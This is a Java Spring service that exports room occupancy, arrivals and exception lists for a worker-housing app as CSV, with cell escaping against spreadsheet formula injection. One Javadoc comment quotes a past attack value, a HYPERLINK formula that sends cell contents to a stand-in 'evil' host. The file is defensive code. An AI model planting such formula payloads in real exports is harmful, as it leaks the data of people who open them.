package com.beduno.occupancy;

import com.beduno.bed.Bed;
import com.beduno.common.security.TenantContext;
import com.beduno.bed.BedRepository;
import com.beduno.stay.StayService;
import lombok.RequiredArgsConstructor;
import org.springframework.context.MessageSource;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.time.LocalDate;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.UUID;
import java.util.stream.Collectors;

@Service
@RequiredArgsConstructor
public class ExportService {

    /**
     * Characters that make a spreadsheet treat a cell as a formula rather than as text. Excel and
     * LibreOffice both evaluate these on open, and these files exist to be opened in exactly
     * those programs.
     */
    private static final String FORMULA_PREFIXES = "=+-@\t\r";

    private final OccupancyService occupancyService;
    private final StayService stayService;
    private final BedRepository bedRepository;
    private final MessageSource messageSource;

    @Transactional(readOnly = true)
    public String exportOccupancy(UUID propertyId, LocalDate date, String language) {
        var locale = toLocale(language);
        var sb = new StringBuilder();
        sb.append(msg("export.occupancy.header", locale)).append("\n");

        for (var room : occupancyService.getOccupancy(propertyId, date)) {
            if (room.occupants().isEmpty()) {
                sb.append(csvRow(
                        room.roomNumber(),
                        blankIfNull(room.floor()),
                        String.valueOf(room.bedCount()),
                        String.valueOf(room.availableBedCount()),
                        "0",
                        "", "", "", ""
                )).append("\n");
            } else {
                for (var occupant : room.occupants()) {
                    sb.append(csvRow(
                            room.roomNumber(),
                            blankIfNull(room.floor()),
                            String.valueOf(room.bedCount()),
                            String.valueOf(room.availableBedCount()),
                            String.valueOf(room.occupiedSpots()),
                            blankIfNull(occupant.bedLabel()),
                            occupant.workerId().toString(),
                            blankIfNull(occupant.firstName()),
                            blankIfNull(occupant.lastName())
                    )).append("\n");
                }
            }
        }
        return sb.toString();
    }

    @Transactional(readOnly = true)
    public String exportArrivals(UUID propertyId, LocalDate date, String language) {
        var locale = toLocale(language);
        var sb = new StringBuilder();
        sb.append(msg("export.arrivals.header", locale)).append("\n");

        var arrivals = stayService.getArrivals(propertyId, date);
        var bedLabelById = bedLabelById(arrivals.stream().map(a -> a.bedId()).toList());

        for (var stay : arrivals) {
            sb.append(csvRow(
                    stay.id().toString(),
                    stay.workerId().toString(),
                    stay.roomId().toString(),
                    blankIfNull(bedLabelById.get(stay.bedId())),
                    blankIfNull(stay.dateFrom() != null ? stay.dateFrom().toString() : null),
                    blankIfNull(stay.dateTo() != null ? stay.dateTo().toString() : null),
                    localizedStatus(stay.status().name(), locale)
            )).append("\n");
        }
        return sb.toString();
    }

    private Map<UUID, String> bedLabelById(List<UUID> bedIds) {
        var distinctIds = bedIds.stream().filter(java.util.Objects::nonNull).distinct().toList();
        if (distinctIds.isEmpty()) {
            return Map.of();
        }
        return bedRepository.findAllByAgencyIdAndIdIn(TenantContext.requireAgencyId(), distinctIds).stream()
                .collect(Collectors.toMap(Bed::getId, Bed::getLabel));
    }

    @Transactional(readOnly = true)
    public String exportExceptions(UUID propertyId, LocalDate date, String language) {
        var locale = toLocale(language);
        var sb = new StringBuilder();
        sb.append(msg("export.exceptions.header", locale)).append("\n");

        for (var ex : occupancyService.getExceptions(propertyId, date)) {
            var exLabel = msg("exception." + ex.exceptionType(), locale);
            if (ex.occupants().isEmpty()) {
                sb.append(csvRow(
                        ex.roomNumber(),
                        exLabel,
                        String.valueOf(ex.bedCount()),
                        String.valueOf(ex.availableBedCount()),
                        String.valueOf(ex.occupiedSpots()),
                        "", "", "", ""
                )).append("\n");
            } else {
                for (var occupant : ex.occupants()) {
                    sb.append(csvRow(
                            ex.roomNumber(),
                            exLabel,
                            String.valueOf(ex.bedCount()),
                            String.valueOf(ex.availableBedCount()),
                            String.valueOf(ex.occupiedSpots()),
                            blankIfNull(occupant.bedLabel()),
                            occupant.workerId().toString(),
                            blankIfNull(occupant.firstName()),
                            blankIfNull(occupant.lastName())
                    )).append("\n");
                }
            }
        }
        return sb.toString();
    }

    private String csvRow(String... fields) {
        var sb = new StringBuilder();
        for (int i = 0; i < fields.length; i++) {
            if (i > 0) {
                sb.append(",");
            }
            sb.append(escapeCsvField(fields[i]));
        }
        return sb.toString();
    }

    /**
     * Quotes and, where necessary, neutralises a cell.
     *
     * <p>Room numbers, floors and worker names are free text that agency users -- and the worker
     * CSV import -- control. A name of {@code =HYPERLINK("http://evil/"&A1,"open")} was written
     * out verbatim and ran when the recipient opened the export. Prefixing with an apostrophe is
     * the standard defence: spreadsheets treat the rest as text and do not display the apostrophe.
     *
     * <p>{@code \r} is quoted alongside {@code \n}: on its own it splits the row in some readers.
     */
    private String escapeCsvField(String value) {
        if (value == null || value.isEmpty()) {
            return "";
        }
        var neutralised = FORMULA_PREFIXES.indexOf(value.charAt(0)) >= 0 ? "'" + value : value;
        if (neutralised.contains(",") || neutralised.contains("\"")
                || neutralised.contains("\n") || neutralised.contains("\r")
                || neutralised != value) {
            return "\"" + neutralised.replace("\"", "\"\"") + "\"";
        }
        return neutralised;
    }

    private String msg(String key, Locale locale) {
        return messageSource.getMessage(key, null, key, locale);
    }

    private String localizedStatus(String status, Locale locale) {
        return msg("status." + status, locale);
    }

    private Locale toLocale(String language) {
        if (language == null) {
            return Locale.ENGLISH;
        }
        return switch (language.toUpperCase()) {
            case "PL" -> Locale.forLanguageTag("pl");
            case "DE" -> Locale.GERMAN;
            case "RU" -> Locale.forLanguageTag("ru");
            case "UA" -> Locale.forLanguageTag("uk");
            default   -> Locale.ENGLISH;
        };
    }

    /** Takes Object because floor is now numeric; a null floor still exports as an empty cell. */
    private String blankIfNull(Object value) {
        return value != null ? String.valueOf(value) : "";
    }
}
